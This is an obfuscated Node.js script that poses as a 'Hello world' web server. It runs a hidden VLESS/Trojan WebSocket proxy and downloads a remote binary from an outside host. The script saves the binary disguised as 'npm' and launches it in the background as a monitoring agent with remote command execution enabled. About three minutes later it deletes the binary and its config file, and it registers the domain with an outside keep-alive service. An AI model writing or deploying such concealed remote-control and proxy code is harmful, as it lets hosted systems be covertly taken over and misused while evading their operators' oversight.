const _0x51d573=_0x36e7;(function(_0x10767b,_0x37ef7c){const _0x3e9e6f=_0x36e7,_0x3c6763=_0x10767b();while(!![]){try{const _0x1636a2=parseInt(_0x3e9e6f(0xde))/0x1*(-parseInt(_0x3e9e6f(0xb1))/0x2)+parseInt(_0x3e9e6f(0xa4))/0x3+parseInt(_0x3e9e6f(0x106))/0x4*(-parseInt(_0x3e9e6f(0xa6))/0x5)+parseInt(_0x3e9e6f(0xe9))/0x6+parseInt(_0x3e9e6f(0xb7))/0x7+-parseInt(_0x3e9e6f(0xc7))/0x8+parseInt(_0x3e9e6f(0x111))/0x9*(-parseInt(_0x3e9e6f(0x117))/0xa);if(_0x1636a2===_0x37ef7c)break;else _0x3c6763['push'](_0x3c6763['shift']());}catch(_0x3c73ca){_0x3c6763['push'](_0x3c6763['shift']());}}}(_0x5c64,0xc1b58));const os=require('os'),http=require(_0x51d573(0x10f)),fs=require('fs'),axios=require(_0x51d573(0xf5)),net=require(_0x51d573(0x107)),path=require(_0x51d573(0xa5)),crypto=require(_0x51d573(0x112)),{Buffer}=require(_0x51d573(0x10d)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x51d573(0xe8)][_0x51d573(0x104)]||_0x51d573(0xfd),NEZHA_SERVER=process['env'][_0x51d573(0x9c)]||'',NEZHA_PORT=process[_0x51d573(0xe8)][_0x51d573(0xca)]||'',NEZHA_KEY=process[_0x51d573(0xe8)]['NEZHA_KEY']||'',DOMAIN=process[_0x51d573(0xe8)][_0x51d573(0xf1)]||_0x51d573(0xdd),AUTO_ACCESS=process[_0x51d573(0xe8)][_0x51d573(0xdf)]||!![],WSPATH=process['env']['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x51d573(0xe8)][_0x51d573(0xb0)]||_0x51d573(0xaf),NAME=process[_0x51d573(0xe8)][_0x51d573(0xec)]||'Hug',PORT=process[_0x51d573(0xe8)][_0x51d573(0x116)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x294ea1=_0x51d573;try{const _0x4ad02a=await axios[_0x294ea1(0xf4)](_0x294ea1(0x115)),_0x5d7b6b=_0x4ad02a[_0x294ea1(0xc4)];ISP=(_0x5d7b6b[_0x294ea1(0x119)]+'-'+_0x5d7b6b[_0x294ea1(0xe6)])[_0x294ea1(0xa7)](/ /g,'_');}catch(_0xdf0cf5){ISP=_0x294ea1(0xb9);}};GetISP();const httpServer=http[_0x51d573(0x9b)]((_0x43ad51,_0x3ed48c)=>{const _0x1de393=_0x51d573;if(_0x43ad51[_0x1de393(0xd7)]==='/'){const _0x2f9f0b=path[_0x1de393(0xc8)](__dirname,_0x1de393(0xcd));fs[_0x1de393(0xee)](_0x2f9f0b,_0x1de393(0xe3),(_0x6a9cd2,_0x3fbe8a)=>{const _0x2ad6f0=_0x1de393;if(_0x6a9cd2){_0x3ed48c[_0x2ad6f0(0xd6)](0xc8,{'Content-Type':_0x2ad6f0(0x9f)}),_0x3ed48c['end'](_0x2ad6f0(0xb4));return;}_0x3ed48c[_0x2ad6f0(0xd6)](0xc8,{'Content-Type':_0x2ad6f0(0x9f)}),_0x3ed48c['end'](_0x3fbe8a);});return;}else{if(_0x43ad51[_0x1de393(0xd7)]==='/'+SUB_PATH){const _0x5030e0=_0x1de393(0xc9)+UUID+'@'+DOMAIN+_0x1de393(0xd2)+DOMAIN+_0x1de393(0x10e)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x420340='trojan://'+UUID+'@'+DOMAIN+_0x1de393(0x11b)+DOMAIN+_0x1de393(0x10e)+DOMAIN+_0x1de393(0xfe)+WSPATH+'#'+NAME+'-'+ISP,_0x2d389f=_0x5030e0+'\x0a'+_0x420340,_0x209948=Buffer[_0x1de393(0xda)](_0x2d389f)[_0x1de393(0xe1)]('base64');_0x3ed48c[_0x1de393(0xd6)](0xc8,{'Content-Type':'text/plain'}),_0x3ed48c[_0x1de393(0xdc)](_0x209948+'\x0a');}else _0x3ed48c[_0x1de393(0xd6)](0x194,{'Content-Type':_0x1de393(0xc0)}),_0x3ed48c['end'](_0x1de393(0xea));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x51d573(0xe0),_0x51d573(0x9e)];function resolveHost(_0x45c16a){return new Promise((_0x252ca2,_0x522b2f)=>{const _0x551de4=_0x36e7;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x551de4(0xf3)](_0x45c16a)){_0x252ca2(_0x45c16a);return;}let _0x413a33=0x0;function _0x4fcf12(){const _0x17ecef=_0x551de4;if(_0x413a33>=DNS_SERVERS[_0x17ecef(0xd5)]){_0x522b2f(new Error(_0x17ecef(0xc5)+_0x45c16a+_0x17ecef(0xf9)));return;}const _0x27e721=DNS_SERVERS[_0x413a33];_0x413a33++;const _0x839db8=_0x17ecef(0xd8)+encodeURIComponent(_0x45c16a)+_0x17ecef(0x109);axios[_0x17ecef(0xf4)](_0x839db8,{'timeout':0x1388,'headers':{'Accept':_0x17ecef(0xc6)}})[_0x17ecef(0x10c)](_0x17d65c=>{const _0x22e20c=_0x17ecef,_0xea405=_0x17d65c[_0x22e20c(0xc4)];if(_0xea405[_0x22e20c(0xed)]===0x0&&_0xea405['Answer']&&_0xea405['Answer'][_0x22e20c(0xd5)]>0x0){const _0x33d402=_0xea405[_0x22e20c(0xa8)]['find'](_0x148525=>_0x148525[_0x22e20c(0x118)]===0x1);if(_0x33d402){_0x252ca2(_0x33d402[_0x22e20c(0xc4)]);return;}}_0x4fcf12();})['catch'](_0x372271=>{_0x4fcf12();});}_0x4fcf12();});}function handleVlessConnection(_0x354ed0,_0x5aa1ee){const _0x7b976a=_0x51d573,[_0x5468e7]=_0x5aa1ee,_0x15eea5=_0x5aa1ee[_0x7b976a(0xa1)](0x1,0x11);if(!_0x15eea5['every']((_0x69e731,_0x4cbbbd)=>_0x69e731==parseInt(uuid[_0x7b976a(0xbe)](_0x4cbbbd*0x2,0x2),0x10)))return![];let _0x5d0749=_0x5aa1ee[_0x7b976a(0xa1)](0x11,0x12)['readUInt8']()+0x13;const _0x4799f3=_0x5aa1ee[_0x7b976a(0xa1)](_0x5d0749,_0x5d0749+=0x2)[_0x7b976a(0xbd)](0x0),_0x33b890=_0x5aa1ee[_0x7b976a(0xa1)](_0x5d0749,_0x5d0749+=0x1)[_0x7b976a(0xe7)](),_0x2d2095=_0x33b890==0x1?_0x5aa1ee['slice'](_0x5d0749,_0x5d0749+=0x4)[_0x7b976a(0xc8)]('.'):_0x33b890==0x2?new TextDecoder()[_0x7b976a(0xd3)](_0x5aa1ee[_0x7b976a(0xa1)](_0x5d0749+0x1,_0x5d0749+=0x1+_0x5aa1ee['slice'](_0x5d0749,_0x5d0749+0x1)[_0x7b976a(0xe7)]())):_0x33b890==0x3?_0x5aa1ee[_0x7b976a(0xa1)](_0x5d0749,_0x5d0749+=0x10)['reduce']((_0x2de99c,_0x6ad3e1,_0x1f09c5,_0x4e58f1)=>_0x1f09c5%0x2?_0x2de99c[_0x7b976a(0x10b)](_0x4e58f1['slice'](_0x1f09c5-0x1,_0x1f09c5+0x1)):_0x2de99c,[])[_0x7b976a(0xbc)](_0x40cab9=>_0x40cab9[_0x7b976a(0xbd)](0x0)[_0x7b976a(0xe1)](0x10))['join'](':'):'';_0x354ed0['send'](new Uint8Array([_0x5468e7,0x0]));const _0x5c2ac3=createWebSocketStream(_0x354ed0);return resolveHost(_0x2d2095)['then'](_0x5812ca=>{const _0x1d4aad=_0x7b976a;net[_0x1d4aad(0xc2)]({'host':_0x5812ca,'port':_0x4799f3},function(){const _0x4e3bcb=_0x1d4aad;this[_0x4e3bcb(0xa3)](_0x5aa1ee[_0x4e3bcb(0xa1)](_0x5d0749)),_0x5c2ac3['on'](_0x4e3bcb(0xa0),()=>{})[_0x4e3bcb(0xb2)](this)['on']('error',()=>{})[_0x4e3bcb(0xb2)](_0x5c2ac3);})['on'](_0x1d4aad(0xa0),()=>{});})['catch'](_0x1ec3c5=>{const _0x208d23=_0x7b976a;net['connect']({'host':_0x2d2095,'port':_0x4799f3},function(){const _0x2a62a5=_0x36e7;this[_0x2a62a5(0xa3)](_0x5aa1ee[_0x2a62a5(0xa1)](_0x5d0749)),_0x5c2ac3['on'](_0x2a62a5(0xa0),()=>{})[_0x2a62a5(0xb2)](this)['on']('error',()=>{})[_0x2a62a5(0xb2)](_0x5c2ac3);})['on'](_0x208d23(0xa0),()=>{});}),!![];}function _0x5c64(){const _0x3d96ce=['Status','readFile','npm','npm\x20running\x20error:','DOMAIN','hex','test','get','axios','once','application/json','log','\x20with\x20all\x20DNS\x20servers','arch','close','Server\x20is\x20running\x20on\x20port\x20','bd06abb8-4895-4474-a50f-e6a4dce3d0f4','&path=%2F','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','connection','/bin/bash','writeFileSync','2053','UUID','setsid\x20nohup\x20./npm\x20-s\x20','2272084rfNPTV','net','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','&type=A','https://amd64.ssss.nyc.mn/agent','concat','then','buffer','&fp=chrome&type=ws&host=','http','createWriteStream','9QjNDUu','crypto','npm\x20is\x20running','https://arm64.ssss.nyc.mn/agent','https://speed.cloudflare.com/meta','PORT','4194350YmTOSj','type','country','update',':443?security=tls&sni=','createServer','NEZHA_SERVER','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','1.1.1.1','text/html','error','slice','split','write','2387352ugvZZE','path','5zXYoBo','replace','Answer','includes','createHash','digest','2083','\x20-p\x20','arm64','sub','SUB_PATH','46622mrYJVx','pipe','pop','Hello\x20world!','utf-8','sha224','3025841oabjjr','catch','Unknown','message','stream','map','readUInt16BE','substr','8443','text/plain','false','connect','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','data','Failed\x20to\x20resolve\x20','application/dns-json','2490304XQaoxc','join','vless://','NEZHA_PORT','npm\x20download\x20successfully','2087','index.html','listen','https://','post','unlink',':443?encryption=none&security=tls&sni=','decode','npm\x20is\x20already\x20running,\x20skip\x20running...','length','writeHead','url','https://dns.google/resolve?name=','every','from','finish','end','1234.abc.com','16NORmzb','AUTO_ACCESS','8.8.4.4','toString','https://amd64.ssss.nyc.mn/v1','utf8','true','--tls','asOrganization','readUInt8','env','7422630THpoGi','Not\x20Found\x0a','client_secret:\x20','NAME'];_0x5c64=function(){return _0x3d96ce;};return _0x5c64();}function handleTrojanConnection(_0x264df0,_0x2fd306){const _0x215a25=_0x51d573;try{if(_0x2fd306[_0x215a25(0xd5)]<0x3a)return![];const _0x37aac3=_0x2fd306[_0x215a25(0xa1)](0x0,0x38)[_0x215a25(0xe1)](),_0x32ea8e=[UUID];let _0x20b349=null;for(const _0x2024b2 of _0x32ea8e){const _0x4df023=crypto[_0x215a25(0xaa)](_0x215a25(0xb6))[_0x215a25(0x11a)](_0x2024b2)[_0x215a25(0xab)](_0x215a25(0xf2));if(_0x4df023===_0x37aac3){_0x20b349=_0x2024b2;break;}}if(!_0x20b349)return![];let _0x3a1b45=0x38;_0x2fd306[_0x3a1b45]===0xd&&_0x2fd306[_0x3a1b45+0x1]===0xa&&(_0x3a1b45+=0x2);const _0x225485=_0x2fd306[_0x3a1b45];if(_0x225485!==0x1)return![];_0x3a1b45+=0x1;const _0x33ed1a=_0x2fd306[_0x3a1b45];_0x3a1b45+=0x1;let _0x2bb940,_0x48fb1e;if(_0x33ed1a===0x1)_0x2bb940=_0x2fd306['slice'](_0x3a1b45,_0x3a1b45+0x4)['join']('.'),_0x3a1b45+=0x4;else{if(_0x33ed1a===0x3){const _0x1dcb65=_0x2fd306[_0x3a1b45];_0x3a1b45+=0x1,_0x2bb940=_0x2fd306[_0x215a25(0xa1)](_0x3a1b45,_0x3a1b45+_0x1dcb65)[_0x215a25(0xe1)](),_0x3a1b45+=_0x1dcb65;}else{if(_0x33ed1a===0x4)_0x2bb940=_0x2fd306[_0x215a25(0xa1)](_0x3a1b45,_0x3a1b45+0x10)['reduce']((_0x18607f,_0x32bba9,_0x32185f,_0x1379a7)=>_0x32185f%0x2?_0x18607f[_0x215a25(0x10b)](_0x1379a7[_0x215a25(0xa1)](_0x32185f-0x1,_0x32185f+0x1)):_0x18607f,[])['map'](_0x18bcd0=>_0x18bcd0['readUInt16BE'](0x0)['toString'](0x10))['join'](':'),_0x3a1b45+=0x10;else return![];}}_0x48fb1e=_0x2fd306[_0x215a25(0xbd)](_0x3a1b45),_0x3a1b45+=0x2;_0x3a1b45<_0x2fd306[_0x215a25(0xd5)]&&_0x2fd306[_0x3a1b45]===0xd&&_0x2fd306[_0x3a1b45+0x1]===0xa&&(_0x3a1b45+=0x2);const _0x46548e=createWebSocketStream(_0x264df0);return resolveHost(_0x2bb940)[_0x215a25(0x10c)](_0x3e88d4=>{const _0x497f24=_0x215a25;net[_0x497f24(0xc2)]({'host':_0x3e88d4,'port':_0x48fb1e},function(){const _0x39e962=_0x497f24;_0x3a1b45<_0x2fd306[_0x39e962(0xd5)]&&this[_0x39e962(0xa3)](_0x2fd306[_0x39e962(0xa1)](_0x3a1b45)),_0x46548e['on'](_0x39e962(0xa0),()=>{})[_0x39e962(0xb2)](this)['on'](_0x39e962(0xa0),()=>{})[_0x39e962(0xb2)](_0x46548e);})['on'](_0x497f24(0xa0),()=>{});})[_0x215a25(0xb8)](_0x211487=>{const _0x3df3b2=_0x215a25;net[_0x3df3b2(0xc2)]({'host':_0x2bb940,'port':_0x48fb1e},function(){const _0x1ad69a=_0x3df3b2;_0x3a1b45<_0x2fd306[_0x1ad69a(0xd5)]&&this[_0x1ad69a(0xa3)](_0x2fd306[_0x1ad69a(0xa1)](_0x3a1b45)),_0x46548e['on']('error',()=>{})[_0x1ad69a(0xb2)](this)['on'](_0x1ad69a(0xa0),()=>{})[_0x1ad69a(0xb2)](_0x46548e);})['on']('error',()=>{});}),!![];}catch(_0x409445){return![];}}wss['on'](_0x51d573(0x100),(_0x4f468a,_0x1d431c)=>{const _0x1b10a8=_0x51d573,_0x298d9e=_0x1d431c['url']||'';_0x4f468a[_0x1b10a8(0xf6)](_0x1b10a8(0xba),_0x8b3e58=>{const _0x3b8647=_0x1b10a8;if(_0x8b3e58[_0x3b8647(0xd5)]>0x11&&_0x8b3e58[0x0]===0x0){const _0x408b57=_0x8b3e58[_0x3b8647(0xa1)](0x1,0x11),_0x582a93=_0x408b57[_0x3b8647(0xd9)]((_0x4d80a8,_0xd1849b)=>_0x4d80a8==parseInt(uuid[_0x3b8647(0xbe)](_0xd1849b*0x2,0x2),0x10));if(_0x582a93){!handleVlessConnection(_0x4f468a,_0x8b3e58)&&_0x4f468a[_0x3b8647(0xfb)]();return;}}!handleTrojanConnection(_0x4f468a,_0x8b3e58)&&_0x4f468a[_0x3b8647(0xfb)]();})['on'](_0x1b10a8(0xa0),()=>{});});const getDownloadUrl=()=>{const _0x53e8bc=_0x51d573,_0x756276=os[_0x53e8bc(0xfa)]();return _0x756276==='arm'||_0x756276===_0x53e8bc(0xae)||_0x756276==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x53e8bc(0x114):!NEZHA_PORT?_0x53e8bc(0xe2):_0x53e8bc(0x10a);},downloadFile=async()=>{const _0x2d75cd=_0x51d573;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5bec9=getDownloadUrl(),_0x579c7e=await axios({'method':_0x2d75cd(0xf4),'url':_0x5bec9,'responseType':_0x2d75cd(0xbb)}),_0xd0b0f2=fs[_0x2d75cd(0x110)](_0x2d75cd(0xef));return _0x579c7e[_0x2d75cd(0xc4)]['pipe'](_0xd0b0f2),new Promise((_0x1fb204,_0x114bed)=>{const _0x2d13bf=_0x2d75cd;_0xd0b0f2['on'](_0x2d13bf(0xdb),()=>{const _0xcbb03c=_0x2d13bf;console[_0xcbb03c(0xf8)](_0xcbb03c(0xcb)),exec('chmod\x20+x\x20npm',_0x3f8951=>{if(_0x3f8951)_0x114bed(_0x3f8951);_0x1fb204();});}),_0xd0b0f2['on'](_0x2d13bf(0xa0),_0x114bed);});}catch(_0x2902c0){throw _0x2902c0;}},runnz=async()=>{const _0x5c73db=_0x51d573;try{const _0x114342=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x5c73db(0xb5)});if(_0x114342['trim']()!==''){console[_0x5c73db(0xf8)](_0x5c73db(0xd4));return;}}catch(_0x4e82cc){}await downloadFile();let _0x40b157='',_0x1de520=['443',_0x5c73db(0xbf),'2096',_0x5c73db(0xcc),_0x5c73db(0xac),_0x5c73db(0x103)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1b687a=_0x1de520[_0x5c73db(0xa9)](NEZHA_PORT)?_0x5c73db(0xe5):'';_0x40b157=_0x5c73db(0x105)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5c73db(0xad)+NEZHA_KEY+'\x20'+_0x1b687a+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x248748=NEZHA_SERVER[_0x5c73db(0xa9)](':')?NEZHA_SERVER[_0x5c73db(0xa2)](':')[_0x5c73db(0xb3)]():'',_0x17b764=_0x1de520['includes'](_0x248748)?_0x5c73db(0xe4):_0x5c73db(0xc1),_0x5c0065=_0x5c73db(0xeb)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x5c73db(0x108)+_0x17b764+_0x5c73db(0xc3)+UUID;fs[_0x5c73db(0x102)]('config.yaml',_0x5c0065);}_0x40b157=_0x5c73db(0xff);}else{console[_0x5c73db(0xf8)](_0x5c73db(0x9d));return;}}try{exec(_0x40b157,{'shell':_0x5c73db(0x101)},_0x565010=>{const _0x547444=_0x5c73db;if(_0x565010)console[_0x547444(0xa0)](_0x547444(0xf0),_0x565010);else console['log'](_0x547444(0x113));});}catch(_0x52109a){console[_0x5c73db(0xa0)]('error:\x20'+_0x52109a);}};async function addAccessTask(){const _0x1fdca8=_0x51d573;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2c7181=_0x1fdca8(0xcf)+DOMAIN;try{const _0x2aacce=await axios[_0x1fdca8(0xd0)]('https://oooo.serv00.net/add-url',{'url':_0x2c7181},{'headers':{'Content-Type':_0x1fdca8(0xf7)}});console[_0x1fdca8(0xf8)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x56e5dd){}}function _0x36e7(_0x37c14d,_0xd73010){const _0x5c649a=_0x5c64();return _0x36e7=function(_0x36e721,_0x49164b){_0x36e721=_0x36e721-0x9b;let _0x5504c4=_0x5c649a[_0x36e721];return _0x5504c4;},_0x36e7(_0x37c14d,_0xd73010);}const delFiles=()=>{const _0x4e79c0=_0x51d573;fs['unlink']('npm',()=>{}),fs[_0x4e79c0(0xd1)]('config.yaml',()=>{});};httpServer[_0x51d573(0xce)](PORT,()=>{const _0x5d4036=_0x51d573;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5d4036(0xf8)](_0x5d4036(0xfc)+PORT);});
